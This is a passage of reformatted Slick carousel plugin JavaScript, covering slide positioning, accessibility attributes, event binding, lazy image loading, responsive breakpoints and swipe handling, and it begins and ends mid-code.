          r.slideCount <= r.options.slidesToShow &&
          ((r.slideOffset = 0), (s = 0)),
          !0 === r.options.centerMode && r.slideCount <= r.options.slidesToShow
            ? (r.slideOffset =
              (r.slideWidth * Math.floor(r.options.slidesToShow)) / 2 -
              (r.slideWidth * r.slideCount) / 2)
            : !0 === r.options.centerMode && !0 === r.options.infinite
              ? (r.slideOffset +=
                r.slideWidth * Math.floor(r.options.slidesToShow / 2) -
                r.slideWidth)
              : !0 === r.options.centerMode &&
              ((r.slideOffset = 0),
                (r.slideOffset +=
                  r.slideWidth * Math.floor(r.options.slidesToShow / 2))),
          (t =
            !1 === r.options.vertical
              ? e * r.slideWidth * -1 + r.slideOffset
              : e * n * -1 + s),
          !0 === r.options.variableWidth &&
          ((i =
            r.slideCount <= r.options.slidesToShow ||
              !1 === r.options.infinite
              ? r.$slideTrack.children(".slick-slide").eq(e)
              : r.$slideTrack
                .children(".slick-slide")
                .eq(e + r.options.slidesToShow)),
            (t =
              !0 === r.options.rtl
                ? i[0]
                  ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width())
                  : 0
                : i[0]
                  ? -1 * i[0].offsetLeft
                  : 0),
            !0 === r.options.centerMode &&
            ((i =
              r.slideCount <= r.options.slidesToShow ||
                !1 === r.options.infinite
                ? r.$slideTrack.children(".slick-slide").eq(e)
                : r.$slideTrack
                  .children(".slick-slide")
                  .eq(e + r.options.slidesToShow + 1)),
              (t =
                !0 === r.options.rtl
                  ? i[0]
                    ? -1 * (r.$slideTrack.width() - i[0].offsetLeft - i.width())
                    : 0
                  : i[0]
                    ? -1 * i[0].offsetLeft
                    : 0),
              (t += (r.$list.width() - i.outerWidth()) / 2))),
          t
        );
      }),
      (t.prototype.getOption = t.prototype.slickGetOption =
        function (e) {
          return this.options[e];
        }),
      (t.prototype.getNavigableIndexes = function () {
        var e,
          t = this,
          n = 0,
          i = 0,
          o = [];
        for (
          !1 === t.options.infinite
            ? (e = t.slideCount)
            : ((n = -1 * t.options.slidesToScroll),
              (i = -1 * t.options.slidesToScroll),
              (e = 2 * t.slideCount));
          n < e;

        )
          o.push(n),
            (n = i + t.options.slidesToScroll),
            (i +=
              t.options.slidesToScroll <= t.options.slidesToShow
                ? t.options.slidesToScroll
                : t.options.slidesToShow);
        return o;
      }),
      (t.prototype.getSlick = function () {
        return this;
      }),
      (t.prototype.getSlideCount = function () {
        var t,
          n,
          i = this;
        return (
          (n =
            !0 === i.options.centerMode
              ? i.slideWidth * Math.floor(i.options.slidesToShow / 2)
              : 0),
          !0 === i.options.swipeToSlide
            ? (i.$slideTrack.find(".slick-slide").each(function (o, r) {
              if (r.offsetLeft - n + e(r).outerWidth() / 2 > -1 * i.swipeLeft)
                return (t = r), !1;
            }),
              Math.abs(e(t).attr("data-slick-index") - i.currentSlide) || 1)
            : i.options.slidesToScroll
        );
      }),
      (t.prototype.goTo = t.prototype.slickGoTo =
        function (e, t) {
          this.changeSlide(
            { data: { message: "index", index: parseInt(e) } },
            t
          );
        }),
      (t.prototype.init = function (t) {
        var n = this;
        e(n.$slider).hasClass("slick-initialized") ||
          (e(n.$slider).addClass("slick-initialized"),
            n.buildRows(),
            n.buildOut(),
            n.setProps(),
            n.startLoad(),
            n.loadSlider(),
            n.initializeEvents(),
            n.updateArrows(),
            n.updateDots(),
            n.checkResponsive(!0),
            n.focusHandler()),
          t && n.$slider.trigger("init", [n]),
          !0 === n.options.accessibility && n.initADA(),
          n.options.autoplay && ((n.paused = !1), n.autoPlay());
      }),
      (t.prototype.initADA = function () {
        var t = this,
          n = Math.ceil(t.slideCount / t.options.slidesToShow),
          i = t.getNavigableIndexes().filter(function (e) {
            return e >= 0 && e < t.slideCount;
          });
        t.$slides
          .add(t.$slideTrack.find(".slick-cloned"))
          .attr({ "aria-hidden": "true", tabindex: "-1" })
          .find("a, input, button, select")
          .attr({ tabindex: "-1" }),
          null !== t.$dots &&
          (t.$slides
            .not(t.$slideTrack.find(".slick-cloned"))
            .each(function (n) {
              var o = i.indexOf(n);
              e(this).attr({
                role: "tabpanel",
                id: "slick-slide" + t.instanceUid + n,
                tabindex: -1,
              }),
                -1 !== o &&
                e(this).attr({
                  "aria-describedby":
                    "slick-slide-control" + t.instanceUid + o,
                });
            }),
            t.$dots
              .attr("role", "tablist")
              .find("li")
              .each(function (o) {
                var r = i[o];
                e(this).attr({ role: "presentation" }),
                  e(this)
                    .find("button")
                    .first()
                    .attr({
                      role: "tab",
                      id: "slick-slide-control" + t.instanceUid + o,
                      "aria-controls": "slick-slide" + t.instanceUid + r,
                      "aria-label": o + 1 + " of " + n,
                      "aria-selected": null,
                      tabindex: "-1",
                    });
              })
              .eq(t.currentSlide)
              .find("button")
              .attr({ "aria-selected": "true", tabindex: "0" })
              .end());
        for (var o = t.currentSlide, r = o + t.options.slidesToShow; o < r; o++)
          t.$slides.eq(o).attr("tabindex", 0);
        t.activateADA();
      }),
      (t.prototype.initArrowEvents = function () {
        var e = this;
        !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          (e.$prevArrow
            .off("click.slick")
            .on("click.slick", { message: "previous" }, e.changeSlide),
            e.$nextArrow
              .off("click.slick")
              .on("click.slick", { message: "next" }, e.changeSlide),
            !0 === e.options.accessibility &&
            (e.$prevArrow.on("keydown.slick", e.keyHandler),
              e.$nextArrow.on("keydown.slick", e.keyHandler)));
      }),
      (t.prototype.initDotEvents = function () {
        var t = this;
        !0 === t.options.dots &&
          (e("li", t.$dots).on(
            "click.slick",
            { message: "index" },
            t.changeSlide
          ),
            !0 === t.options.accessibility &&
            t.$dots.on("keydown.slick", t.keyHandler)),
          !0 === t.options.dots &&
          !0 === t.options.pauseOnDotsHover &&
          e("li", t.$dots)
            .on("mouseenter.slick", e.proxy(t.interrupt, t, !0))
            .on("mouseleave.slick", e.proxy(t.interrupt, t, !1));
      }),
      (t.prototype.initSlideEvents = function () {
        var t = this;
        t.options.pauseOnHover &&
          (t.$list.on("mouseenter.slick", e.proxy(t.interrupt, t, !0)),
            t.$list.on("mouseleave.slick", e.proxy(t.interrupt, t, !1)));
      }),
      (t.prototype.initializeEvents = function () {
        var t = this;
        t.initArrowEvents(),
          t.initDotEvents(),
          t.initSlideEvents(),
          t.$list.on(
            "touchstart.slick mousedown.slick",
            { action: "start" },
            t.swipeHandler
          ),
          t.$list.on(
            "touchmove.slick mousemove.slick",
            { action: "move" },
            t.swipeHandler
          ),
          t.$list.on(
            "touchend.slick mouseup.slick",
            { action: "end" },
            t.swipeHandler
          ),
          t.$list.on(
            "touchcancel.slick mouseleave.slick",
            { action: "end" },
            t.swipeHandler
          ),
          t.$list.on("click.slick", t.clickHandler),
          e(document).on(t.visibilityChange, e.proxy(t.visibility, t)),
          !0 === t.options.accessibility &&
          t.$list.on("keydown.slick", t.keyHandler),
          !0 === t.options.focusOnSelect &&
          e(t.$slideTrack).children().on("click.slick", t.selectHandler),
          e(window).on(
            "orientationchange.slick.slick-" + t.instanceUid,
            e.proxy(t.orientationChange, t)
          ),
          e(window).on(
            "resize.slick.slick-" + t.instanceUid,
            e.proxy(t.resize, t)
          ),
          e("[draggable!=true]", t.$slideTrack).on(
            "dragstart",
            t.preventDefault
          ),
          e(window).on("load.slick.slick-" + t.instanceUid, t.setPosition),
          e(t.setPosition);
      }),
      (t.prototype.initUI = function () {
        var e = this;
        !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          (e.$prevArrow.show(), e.$nextArrow.show()),
          !0 === e.options.dots &&
          e.slideCount > e.options.slidesToShow &&
          e.$dots.show();
      }),
      (t.prototype.keyHandler = function (e) {
        var t = this;
        e.target.tagName.match("TEXTAREA|INPUT|SELECT") ||
          (37 === e.keyCode && !0 === t.options.accessibility
            ? t.changeSlide({
              data: { message: !0 === t.options.rtl ? "next" : "previous" },
            })
            : 39 === e.keyCode &&
            !0 === t.options.accessibility &&
            t.changeSlide({
              data: { message: !0 === t.options.rtl ? "previous" : "next" },
            }));
      }),
      (t.prototype.lazyLoad = function () {
        function t(t) {
          e("img[data-lazy]", t).each(function () {
            var t = e(this),
              n = e(this).attr("data-lazy"),
              i = e(this).attr("data-srcset"),
              o = e(this).attr("data-sizes") || r.$slider.attr("data-sizes"),
              s = document.createElement("img");
            (s.onload = function () {
              t.animate({ opacity: 0 }, 100, function () {
                i && (t.attr("srcset", i), o && t.attr("sizes", o)),
                  t.attr("src", n).animate({ opacity: 1 }, 200, function () {
                    t.removeAttr(
                      "data-lazy data-srcset data-sizes"
                    ).removeClass("slick-loading");
                  }),
                  r.$slider.trigger("lazyLoaded", [r, t, n]);
              });
            }),
              (s.onerror = function () {
                t
                  .removeAttr("data-lazy")
                  .removeClass("slick-loading")
                  .addClass("slick-lazyload-error"),
                  r.$slider.trigger("lazyLoadError", [r, t, n]);
              }),
              (s.src = n);
          });
        }
        var n,
          i,
          o,
          r = this;
        if (
          (!0 === r.options.centerMode
            ? !0 === r.options.infinite
              ? (o =
                (i = r.currentSlide + (r.options.slidesToShow / 2 + 1)) +
                r.options.slidesToShow +
                2)
              : ((i = Math.max(
                0,
                r.currentSlide - (r.options.slidesToShow / 2 + 1)
              )),
                (o = r.options.slidesToShow / 2 + 1 + 2 + r.currentSlide))
            : ((i = r.options.infinite
              ? r.options.slidesToShow + r.currentSlide
              : r.currentSlide),
              (o = Math.ceil(i + r.options.slidesToShow)),
              !0 === r.options.fade &&
              (i > 0 && i--, o <= r.slideCount && o++)),
            (n = r.$slider.find(".slick-slide").slice(i, o)),
            "anticipated" === r.options.lazyLoad)
        )
          for (
            var s = i - 1, a = o, l = r.$slider.find(".slick-slide"), c = 0;
            c < r.options.slidesToScroll;
            c++
          )
            s < 0 && (s = r.slideCount - 1),
              (n = (n = n.add(l.eq(s))).add(l.eq(a))),
              s--,
              a++;
        t(n),
          r.slideCount <= r.options.slidesToShow
            ? t(r.$slider.find(".slick-slide"))
            : r.currentSlide >= r.slideCount - r.options.slidesToShow
              ? t(
                r.$slider.find(".slick-cloned").slice(0, r.options.slidesToShow)
              )
              : 0 === r.currentSlide &&
              t(
                r.$slider
                  .find(".slick-cloned")
                  .slice(-1 * r.options.slidesToShow)
              );
      }),
      (t.prototype.loadSlider = function () {
        var e = this;
        e.setPosition(),
          e.$slideTrack.css({ opacity: 1 }),
          e.$slider.removeClass("slick-loading"),
          e.initUI(),
          "progressive" === e.options.lazyLoad && e.progressiveLazyLoad();
      }),
      (t.prototype.next = t.prototype.slickNext =
        function () {
          this.changeSlide({ data: { message: "next" } });
        }),
      (t.prototype.orientationChange = function () {
        this.checkResponsive(), this.setPosition();
      }),
      (t.prototype.pause = t.prototype.slickPause =
        function () {
          this.autoPlayClear(), (this.paused = !0);
        }),
      (t.prototype.play = t.prototype.slickPlay =
        function () {
          var e = this;
          e.autoPlay(),
            (e.options.autoplay = !0),
            (e.paused = !1),
            (e.focussed = !1),
            (e.interrupted = !1);
        }),
      (t.prototype.postSlide = function (t) {
        var n = this;
        n.unslicked ||
          (n.$slider.trigger("afterChange", [n, t]),
            (n.animating = !1),
            n.slideCount > n.options.slidesToShow && n.setPosition(),
            (n.swipeLeft = null),
            n.options.autoplay && n.autoPlay(),
            !0 === n.options.accessibility &&
            (n.initADA(),
              n.options.focusOnChange &&
              e(n.$slides.get(n.currentSlide)).attr("tabindex", 0).focus()));
      }),
      (t.prototype.prev = t.prototype.slickPrev =
        function () {
          this.changeSlide({ data: { message: "previous" } });
        }),
      (t.prototype.preventDefault = function (e) {
        e.preventDefault();
      }),
      (t.prototype.progressiveLazyLoad = function (t) {
        t = t || 1;
        var n,
          i,
          o,
          r,
          s,
          a = this,
          l = e("img[data-lazy]", a.$slider);
        l.length
          ? ((n = l.first()),
            (i = n.attr("data-lazy")),
            (o = n.attr("data-srcset")),
            (r = n.attr("data-sizes") || a.$slider.attr("data-sizes")),
            ((s = document.createElement("img")).onload = function () {
              o && (n.attr("srcset", o), r && n.attr("sizes", r)),
                n
                  .attr("src", i)
                  .removeAttr("data-lazy data-srcset data-sizes")
                  .removeClass("slick-loading"),
                !0 === a.options.adaptiveHeight && a.setPosition(),
                a.$slider.trigger("lazyLoaded", [a, n, i]),
                a.progressiveLazyLoad();
            }),
            (s.onerror = function () {
              t < 3
                ? setTimeout(function () {
                  a.progressiveLazyLoad(t + 1);
                }, 500)
                : (n
                  .removeAttr("data-lazy")
                  .removeClass("slick-loading")
                  .addClass("slick-lazyload-error"),
                  a.$slider.trigger("lazyLoadError", [a, n, i]),
                  a.progressiveLazyLoad());
            }),
            (s.src = i))
          : a.$slider.trigger("allImagesLoaded", [a]);
      }),
      (t.prototype.refresh = function (t) {
        var n,
          i,
          o = this;
        (i = o.slideCount - o.options.slidesToShow),
          !o.options.infinite && o.currentSlide > i && (o.currentSlide = i),
          o.slideCount <= o.options.slidesToShow && (o.currentSlide = 0),
          (n = o.currentSlide),
          o.destroy(!0),
          e.extend(o, o.initials, { currentSlide: n }),
          o.init(),
          t || o.changeSlide({ data: { message: "index", index: n } }, !1);
      }),
      (t.prototype.registerBreakpoints = function () {
        var t,
          n,
          i,
          o = this,
          r = o.options.responsive || null;
        if ("array" === e.type(r) && r.length) {
          for (t in ((o.respondTo = o.options.respondTo || "window"), r))
            if (((i = o.breakpoints.length - 1), r.hasOwnProperty(t))) {
              for (n = r[t].breakpoint; i >= 0;)
                o.breakpoints[i] &&
                  o.breakpoints[i] === n &&
                  o.breakpoints.splice(i, 1),
                  i--;
              o.breakpoints.push(n), (o.breakpointSettings[n] = r[t].settings);
            }
          o.breakpoints.sort(function (e, t) {
            return o.options.mobileFirst ? e - t : t - e;
          });
        }
      }),
      (t.prototype.reinit = function () {
        var t = this;
        (t.$slides = t.$slideTrack
          .children(t.options.slide)
          .addClass("slick-slide")),
          (t.slideCount = t.$slides.length),
          t.currentSlide >= t.slideCount &&
          0 !== t.currentSlide &&
          (t.currentSlide = t.currentSlide - t.options.slidesToScroll),
          t.slideCount <= t.options.slidesToShow && (t.currentSlide = 0),
          t.registerBreakpoints(),
          t.setProps(),
          t.setupInfinite(),
          t.buildArrows(),
          t.updateArrows(),
          t.initArrowEvents(),
          t.buildDots(),
          t.updateDots(),
          t.initDotEvents(),
          t.cleanUpSlideEvents(),
          t.initSlideEvents(),
          t.checkResponsive(!1, !0),
          !0 === t.options.focusOnSelect &&
          e(t.$slideTrack).children().on("click.slick", t.selectHandler),
          t.setSlideClasses(
            "number" == typeof t.currentSlide ? t.currentSlide : 0
          ),
          t.setPosition(),
          t.focusHandler(),
          (t.paused = !t.options.autoplay),
          t.autoPlay(),
          t.$slider.trigger("reInit", [t]);
      }),
      (t.prototype.resize = function () {
        var t = this;
        e(window).width() !== t.windowWidth &&
          (clearTimeout(t.windowDelay),
            (t.windowDelay = window.setTimeout(function () {
              (t.windowWidth = e(window).width()),
                t.checkResponsive(),
                t.unslicked || t.setPosition();
            }, 50)));
      }),
      (t.prototype.removeSlide = t.prototype.slickRemove =
        function (e, t, n) {
          var i = this;
          if (
            ((e =
              "boolean" == typeof e
                ? !0 === (t = e)
                  ? 0
                  : i.slideCount - 1
                : !0 === t
                  ? --e
                  : e),
              i.slideCount < 1 || e < 0 || e > i.slideCount - 1)
          )
            return !1;
          i.unload(),
            !0 === n
              ? i.$slideTrack.children().remove()
              : i.$slideTrack.children(this.options.slide).eq(e).remove(),
            (i.$slides = i.$slideTrack.children(this.options.slide)),
            i.$slideTrack.children(this.options.slide).detach(),
            i.$slideTrack.append(i.$slides),
            (i.$slidesCache = i.$slides),
            i.reinit();
        }),
      (t.prototype.setCSS = function (e) {
        var t,
          n,
          i = this,
          o = {};
        !0 === i.options.rtl && (e = -e),
          (t = "left" == i.positionProp ? Math.ceil(e) + "px" : "0px"),
          (n = "top" == i.positionProp ? Math.ceil(e) + "px" : "0px"),
          (o[i.positionProp] = e),
          !1 === i.transformsEnabled
            ? i.$slideTrack.css(o)
            : ((o = {}),
              !1 === i.cssTransitions
                ? ((o[i.animType] = "translate(" + t + ", " + n + ")"),
                  i.$slideTrack.css(o))
                : ((o[i.animType] = "translate3d(" + t + ", " + n + ", 0px)"),
                  i.$slideTrack.css(o)));
      }),
      (t.prototype.setDimensions = function () {
        var e = this;
        !1 === e.options.vertical
          ? !0 === e.options.centerMode &&
          e.$list.css({ padding: "0px " + e.options.centerPadding })
          : (e.$list.height(
            e.$slides.first().outerHeight(!0) * e.options.slidesToShow
          ),
            !0 === e.options.centerMode &&
            e.$list.css({ padding: e.options.centerPadding + " 0px" })),
          (e.listWidth = e.$list.width()),
          (e.listHeight = e.$list.height()),
          !1 === e.options.vertical && !1 === e.options.variableWidth
            ? ((e.slideWidth = Math.ceil(e.listWidth / e.options.slidesToShow)),
              e.$slideTrack.width(
                Math.ceil(
                  e.slideWidth * e.$slideTrack.children(".slick-slide").length
                )
              ))
            : !0 === e.options.variableWidth
              ? e.$slideTrack.width(5e3 * e.slideCount)
              : ((e.slideWidth = Math.ceil(e.listWidth)),
                e.$slideTrack.height(
                  Math.ceil(
                    e.$slides.first().outerHeight(!0) *
                    e.$slideTrack.children(".slick-slide").length
                  )
                ));
        var t = e.$slides.first().outerWidth(!0) - e.$slides.first().width();
        !1 === e.options.variableWidth &&
          e.$slideTrack.children(".slick-slide").width(e.slideWidth - t);
      }),
      (t.prototype.setFade = function () {
        var t,
          n = this;
        n.$slides.each(function (i, o) {
          (t = n.slideWidth * i * -1),
            !0 === n.options.rtl
              ? e(o).css({
                position: "relative",
                right: t,
                top: 0,
                zIndex: n.options.zIndex - 2,
                opacity: 0,
              })
              : e(o).css({
                position: "relative",
                left: t,
                top: 0,
                zIndex: n.options.zIndex - 2,
                opacity: 0,
              });
        }),
          n.$slides
            .eq(n.currentSlide)
            .css({ zIndex: n.options.zIndex - 1, opacity: 1 });
      }),
      (t.prototype.setHeight = function () {
        var e = this;
        if (
          1 === e.options.slidesToShow &&
          !0 === e.options.adaptiveHeight &&
          !1 === e.options.vertical
        ) {
          var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
          e.$list.css("height", t);
        }
      }),
      (t.prototype.setOption = t.prototype.slickSetOption =
        function () {
          var t,
            n,
            i,
            o,
            r,
            s = this,
            a = !1;
          if (
            ("object" === e.type(arguments[0])
              ? ((i = arguments[0]), (a = arguments[1]), (r = "multiple"))
              : "string" === e.type(arguments[0]) &&
              ((i = arguments[0]),
                (o = arguments[1]),
                (a = arguments[2]),
                "responsive" === arguments[0] &&
                  "array" === e.type(arguments[1])
                  ? (r = "responsive")
                  : void 0 !== arguments[1] && (r = "single")),
              "single" === r)
          )
            s.options[i] = o;
          else if ("multiple" === r)
            e.each(i, function (e, t) {
              s.options[e] = t;
            });
          else if ("responsive" === r)
            for (n in o)
              if ("array" !== e.type(s.options.responsive))
                s.options.responsive = [o[n]];
              else {
                for (t = s.options.responsive.length - 1; t >= 0;)
                  s.options.responsive[t].breakpoint === o[n].breakpoint &&
                    s.options.responsive.splice(t, 1),
                    t--;
                s.options.responsive.push(o[n]);
              }
          a && (s.unload(), s.reinit());
        }),
      (t.prototype.setPosition = function () {
        var e = this;
        e.setDimensions(),
          e.setHeight(),
          !1 === e.options.fade
            ? e.setCSS(e.getLeft(e.currentSlide))
            : e.setFade(),
          e.$slider.trigger("setPosition", [e]);
      }),
      (t.prototype.setProps = function () {
        var e = this,
          t = document.body.style;
        (e.positionProp = !0 === e.options.vertical ? "top" : "left"),
          "top" === e.positionProp
            ? e.$slider.addClass("slick-vertical")
            : e.$slider.removeClass("slick-vertical"),
          (void 0 === t.WebkitTransition &&
            void 0 === t.MozTransition &&
            void 0 === t.msTransition) ||
          (!0 === e.options.useCSS && (e.cssTransitions = !0)),
          e.options.fade &&
          ("number" == typeof e.options.zIndex
            ? e.options.zIndex < 3 && (e.options.zIndex = 3)
            : (e.options.zIndex = e.defaults.zIndex)),
          void 0 !== t.OTransform &&
          ((e.animType = "OTransform"),
            (e.transformType = "-o-transform"),
            (e.transitionType = "OTransition"),
            void 0 === t.perspectiveProperty &&
            void 0 === t.webkitPerspective &&
            (e.animType = !1)),
          void 0 !== t.MozTransform &&
          ((e.animType = "MozTransform"),
            (e.transformType = "-moz-transform"),
            (e.transitionType = "MozTransition"),
            void 0 === t.perspectiveProperty &&
            void 0 === t.MozPerspective &&
            (e.animType = !1)),
          void 0 !== t.webkitTransform &&
          ((e.animType = "webkitTransform"),
            (e.transformType = "-webkit-transform"),
            (e.transitionType = "webkitTransition"),
            void 0 === t.perspectiveProperty &&
            void 0 === t.webkitPerspective &&
            (e.animType = !1)),
          void 0 !== t.msTransform &&
          ((e.animType = "msTransform"),
            (e.transformType = "-ms-transform"),
            (e.transitionType = "msTransition"),
            void 0 === t.msTransform && (e.animType = !1)),
          void 0 !== t.transform &&
          !1 !== e.animType &&
          ((e.animType = "transform"),
            (e.transformType = "transform"),
            (e.transitionType = "transition")),
          (e.transformsEnabled =
            e.options.useTransform && null !== e.animType && !1 !== e.animType);
      }),
      (t.prototype.setSlideClasses = function (e) {
        var t,
          n,
          i,
          o,
          r = this;
        if (
          ((n = r.$slider
            .find(".slick-slide")
            .removeClass("slick-active slick-center slick-current")
            .attr("aria-hidden", "true")),
            r.$slides.eq(e).addClass("slick-current"),
            !0 === r.options.centerMode)
        ) {
          var s = r.options.slidesToShow % 2 == 0 ? 1 : 0;
          (t = Math.floor(r.options.slidesToShow / 2)),
            !0 === r.options.infinite &&
            (e >= t && e <= r.slideCount - 1 - t
              ? r.$slides
                .slice(e - t + s, e + t + 1)
                .addClass("slick-active")
                .attr("aria-hidden", "false")
              : ((i = r.options.slidesToShow + e),
                n
                  .slice(i - t + 1 + s, i + t + 2)
                  .addClass("slick-active")
                  .attr("aria-hidden", "false")),
              0 === e
                ? n
                  .eq(n.length - 1 - r.options.slidesToShow)
                  .addClass("slick-center")
                : e === r.slideCount - 1 &&
                n.eq(r.options.slidesToShow).addClass("slick-center")),
            r.$slides.eq(e).addClass("slick-center");
        } else
          e >= 0 && e <= r.slideCount - r.options.slidesToShow
            ? r.$slides
              .slice(e, e + r.options.slidesToShow)
              .addClass("slick-active")
              .attr("aria-hidden", "false")
            : n.length <= r.options.slidesToShow
              ? n.addClass("slick-active").attr("aria-hidden", "false")
              : ((o = r.slideCount % r.options.slidesToShow),
                (i = !0 === r.options.infinite ? r.options.slidesToShow + e : e),
                r.options.slidesToShow == r.options.slidesToScroll &&
                  r.slideCount - e < r.options.slidesToShow
                  ? n
                    .slice(i - (r.options.slidesToShow - o), i + o)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false")
                  : n
                    .slice(i, i + r.options.slidesToShow)
                    .addClass("slick-active")
                    .attr("aria-hidden", "false"));
        ("ondemand" !== r.options.lazyLoad &&
          "anticipated" !== r.options.lazyLoad) ||
          r.lazyLoad();
      }),
      (t.prototype.setupInfinite = function () {
        var t,
          n,
          i,
          o = this;
        if (
          (!0 === o.options.fade && (o.options.centerMode = !1),
            !0 === o.options.infinite &&
            !1 === o.options.fade &&
            ((n = null), o.slideCount > o.options.slidesToShow))
        ) {
          for (
            i =
            !0 === o.options.centerMode
              ? o.options.slidesToShow + 1
              : o.options.slidesToShow,
            t = o.slideCount;
            t > o.slideCount - i;
            t -= 1
          )
            (n = t - 1),
              e(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n - o.slideCount)
                .prependTo(o.$slideTrack)
                .addClass("slick-cloned");
          for (t = 0; t < i + o.slideCount; t += 1)
            (n = t),
              e(o.$slides[n])
                .clone(!0)
                .attr("id", "")
                .attr("data-slick-index", n + o.slideCount)
                .appendTo(o.$slideTrack)
                .addClass("slick-cloned");
          o.$slideTrack
            .find(".slick-cloned")
            .find("[id]")
            .each(function () {
              e(this).attr("id", "");
            });
        }
      }),
      (t.prototype.interrupt = function (e) {
        e || this.autoPlay(), (this.interrupted = e);
      }),
      (t.prototype.selectHandler = function (t) {
        var n = this,
          i = e(t.target).is(".slick-slide")
            ? e(t.target)
            : e(t.target).parents(".slick-slide"),
          o = parseInt(i.attr("data-slick-index"));
        o || (o = 0),
          n.slideCount <= n.options.slidesToShow
            ? n.slideHandler(o, !1, !0)
            : n.slideHandler(o);
      }),
      (t.prototype.slideHandler = function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l = null,
          c = this;
        if (
          ((t = t || !1),
            !(
              (!0 === c.animating && !0 === c.options.waitForAnimate) ||
              (!0 === c.options.fade && c.currentSlide === e)
            ))
        )
          if (
            (!1 === t && c.asNavFor(e),
              (i = e),
              (l = c.getLeft(i)),
              (s = c.getLeft(c.currentSlide)),
              (c.currentLeft = null === c.swipeLeft ? s : c.swipeLeft),
              !1 === c.options.infinite &&
              !1 === c.options.centerMode &&
              (e < 0 || e > c.getDotCount() * c.options.slidesToScroll))
          )
            !1 === c.options.fade &&
              ((i = c.currentSlide),
                !0 !== n
                  ? c.animateSlide(s, function () {
                    c.postSlide(i);
                  })
                  : c.postSlide(i));
          else if (
            !1 === c.options.infinite &&
            !0 === c.options.centerMode &&
            (e < 0 || e > c.slideCount - c.options.slidesToScroll)
          )
            !1 === c.options.fade &&
              ((i = c.currentSlide),
                !0 !== n
                  ? c.animateSlide(s, function () {
                    c.postSlide(i);
                  })
                  : c.postSlide(i));
          else {
            if (
              (c.options.autoplay && clearInterval(c.autoPlayTimer),
                (o =
                  i < 0
                    ? c.slideCount % c.options.slidesToScroll != 0
                      ? c.slideCount - (c.slideCount % c.options.slidesToScroll)
                      : c.slideCount + i
                    : i >= c.slideCount
                      ? c.slideCount % c.options.slidesToScroll != 0
                        ? 0
                        : i - c.slideCount
                      : i),
                (c.animating = !0),
                c.$slider.trigger("beforeChange", [c, c.currentSlide, o]),
                (r = c.currentSlide),
                (c.currentSlide = o),
                c.setSlideClasses(c.currentSlide),
                c.options.asNavFor &&
                (a = (a = c.getNavTarget()).slick("getSlick")).slideCount <=
                a.options.slidesToShow &&
                a.setSlideClasses(c.currentSlide),
                c.updateDots(),
                c.updateArrows(),
                !0 === c.options.fade)
            )
              return (
                !0 !== n
                  ? (c.fadeSlideOut(r),
                    c.fadeSlide(o, function () {
                      c.postSlide(o);
                    }))
                  : c.postSlide(o),
                void c.animateHeight()
              );
            !0 !== n
              ? c.animateSlide(l, function () {
                c.postSlide(o);
              })
              : c.postSlide(o);
          }
      }),
      (t.prototype.startLoad = function () {
        var e = this;
        !0 === e.options.arrows &&
          e.slideCount > e.options.slidesToShow &&
          (e.$prevArrow.hide(), e.$nextArrow.hide()),
          !0 === e.options.dots &&
          e.slideCount > e.options.slidesToShow &&
          e.$dots.hide(),
          e.$slider.addClass("slick-loading");
      }),
      (t.prototype.swipeDirection = function () {
        var e,
          t,
          n,
          i,
          o = this;
        return (
          (e = o.touchObject.startX - o.touchObject.curX),
          (t = o.touchObject.startY - o.touchObject.curY),
          (n = Math.atan2(t, e)),
          (i = Math.round((180 * n) / Math.PI)) < 0 && (i = 360 - Math.abs(i)),
          (i <= 45 && i >= 0) || (i <= 360 && i >= 315)
            ? !1 === o.options.rtl
              ? "left"
              : "right"
            : i >= 135 && i <= 225
              ? !1 === o.options.rtl
                ? "right"
                : "left"
              : !0 === o.options.verticalSwiping
                ? i >= 35 && i <= 135
                  ? "down"
                  : "up"
                : "vertical"
        );
      }),
      (t.prototype.swipeEnd = function (e) {
        var t,
          n,
          i = this;
        if (((i.dragging = !1), (i.swiping = !1), i.scrolling))
          return (i.scrolling = !1), !1;
        if (
          ((i.interrupted = !1),
            (i.shouldClick = !(i.touchObject.swipeLength > 10)),
            void 0 === i.touchObject.curX)
        )
          return !1;
        if (
          (!0 === i.touchObject.edgeHit &&
            i.$slider.trigger("edge", [i, i.swipeDirection()]),
            i.touchObject.swipeLength >= i.touchObject.minSwipe)
        ) {
          switch ((n = i.swipeDirection())) {
            case "left":
            case "down":
              (t = i.options.swipeToSlide
                ? i.checkNavigable(i.currentSlide + i.getSlideCount())
                : i.currentSlide + i.getSlideCount()),
                (i.currentDirection = 0);
              break;
            case "right":
            case "up":
              (t = i.options.swipeToSlide
                ? i.checkNavigable(i.currentSlide - i.getSlideCount())
                : i.currentSlide - i.getSlideCount()),
                (i.currentDirection = 1);
          }
          "vertical" != n &&
            (i.slideHandler(t),
              (i.touchObject = {}),
              i.$slider.trigger("swipe", [i, n]));
        } else
          i.touchObject.startX !== i.touchObject.curX &&
            (i.slideHandler(i.currentSlide), (i.touchObject = {}));
      }),
      (t.prototype.swipeHandler = function (e) {
        var t = this;
        if (
          !(
            !1 === t.options.swipe ||
            ("ontouchend" in document && !1 === t.options.swipe) ||
            (!1 === t.options.draggable && -1 !== e.type.indexOf("mouse"))
          )
        )
          switch (
          ((t.touchObject.fingerCount =
            e.originalEvent && void 0 !== e.originalEvent.touches
              ? e.originalEvent.touches.length
              : 1),
            (t.touchObject.minSwipe = t.listWidth / t.options.touchThreshold),
            !0 === t.options.verticalSwiping &&
            (t.touchObject.minSwipe =
              t.listHeight / t.options.touchThreshold),
            e.data.action)
          ) {
            case "start":
              t.swipeStart(e);
              break;
            case "move":
              t.swipeMove(e);
              break;
            case "end":
              t.swipeEnd(e);
          }
      }),
      (t.prototype.swipeMove = function (e) {
        var t,
          n,
          i,
          o,
          r,
          s,
          a = this;
        return (
          (r = void 0 !== e.originalEvent ? e.originalEvent.touches : null),
          !(!a.dragging || a.scrolling || (r && 1 !== r.length)) &&
          ((t = a.getLeft(a.currentSlide)),
            (a.touchObject.curX = void 0 !== r ? r[0].pageX : e.clientX),
            (a.touchObject.curY = void 0 !== r ? r[0].pageY : e.clientY),
            (a.touchObject.swipeLength = Math.round(
              Math.sqrt(Math.pow(a.touchObject.curX - a.touchObject.startX, 2))
            )),
            (s = Math.round(
